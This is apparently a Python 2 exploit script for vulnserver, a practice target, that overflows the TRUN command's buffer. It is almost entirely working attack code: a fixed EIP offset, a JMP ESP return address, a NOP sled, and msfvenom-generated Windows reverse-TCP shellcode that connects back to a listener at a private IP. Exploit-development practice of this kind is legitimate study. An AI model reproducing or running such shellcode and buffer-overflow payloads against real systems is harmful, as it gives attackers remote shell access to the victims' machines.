#!/usr/bin/python

#this is for vulnserver badchars check
import socket
import sys

#JMP ESP located at 0x625011af
#root@kali:/# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00" 

shellcode= ("\xba\x2b\x6d\x1b\x63\xd9\xf7\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x57\x12\x03\x57\x12\x83\xec\x69\xf9\x96\x0e\x99\x7f"
"\x58\xee\x5a\xe0\xd0\x0b\x6b\x20\x86\x58\xdc\x90\xcc\x0c\xd1"
"\x5b\x80\xa4\x62\x29\x0d\xcb\xc3\x84\x6b\xe2\xd4\xb5\x48\x65"
"\x57\xc4\x9c\x45\x66\x07\xd1\x84\xaf\x7a\x18\xd4\x78\xf0\x8f"
"\xc8\x0d\x4c\x0c\x63\x5d\x40\x14\x90\x16\x63\x35\x07\x2c\x3a"
"\x95\xa6\xe1\x36\x9c\xb0\xe6\x73\x56\x4b\xdc\x08\x69\x9d\x2c"
"\xf0\xc6\xe0\x80\x03\x16\x25\x26\xfc\x6d\x5f\x54\x81\x75\xa4"
"\x26\x5d\xf3\x3e\x80\x16\xa3\x9a\x30\xfa\x32\x69\x3e\xb7\x31"
"\x35\x23\x46\x95\x4e\x5f\xc3\x18\x80\xe9\x97\x3e\x04\xb1\x4c"
"\x5e\x1d\x1f\x22\x5f\x7d\xc0\x9b\xc5\xf6\xed\xc8\x77\x55\x7a"
"\x3c\xba\x65\x7a\x2a\xcd\x16\x48\xf5\x65\xb0\xe0\x7e\xa0\x47"
"\x06\x55\x14\xd7\xf9\x56\x65\xfe\x3d\x02\x35\x68\x97\x2b\xde"
"\x68\x18\xfe\x71\x38\xb6\x51\x32\xe8\x76\x02\xda\xe2\x78\x7d"
"\xfa\x0d\x53\x16\x91\xf4\x34\xd9\xce\xf7\xd5\xb1\x0c\xf7\xc4"
"\x1d\x98\x11\x8c\x8d\xcc\x8a\x39\x37\x55\x40\xdb\xb8\x43\x2d"
"\xdb\x33\x60\xd2\x92\xb3\x0d\xc0\x43\x34\x58\xba\xc2\x4b\x76"
"\xd2\x89\xde\x1d\x22\xc7\xc2\x89\x75\x80\x35\xc0\x13\x3c\x6f"
"\x7a\x01\xbd\xe9\x45\x81\x1a\xca\x48\x08\xee\x76\x6f\x1a\x36"
"\x76\x2b\x4e\xe6\x21\xe5\x38\x40\x98\x47\x92\x1a\x77\x0e\x72"
"\xda\xbb\x91\x04\xe3\x91\x67\xe8\x52\x4c\x3e\x17\x5a\x18\xb6"
"\x60\x86\xb8\x39\xbb\x02\xd8\xdb\x69\x7f\x71\x42\xf8\xc2\x1c"
"\x75\xd7\x01\x19\xf6\xdd\xf9\xde\xe6\x94\xfc\x9b\xa0\x45\x8d"
"\xb4\x44\x69\x22\xb4\x4c")

offset_to_eip =  2003 
total_size =  5900
jmpesp="\xaf\x11\x50\x62"
buffer = "A" * offset_to_eip
buffer += jmpesp
buffer+="\x90"*8
buffer += shellcode
buffer += "B" * (total_size - len(buffer))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
	connect = s.connect(('192.168.1.13',9999))
	s.send('TRUN /.:/' + buffer)
	s.close()
except:
	print "Check debugger!"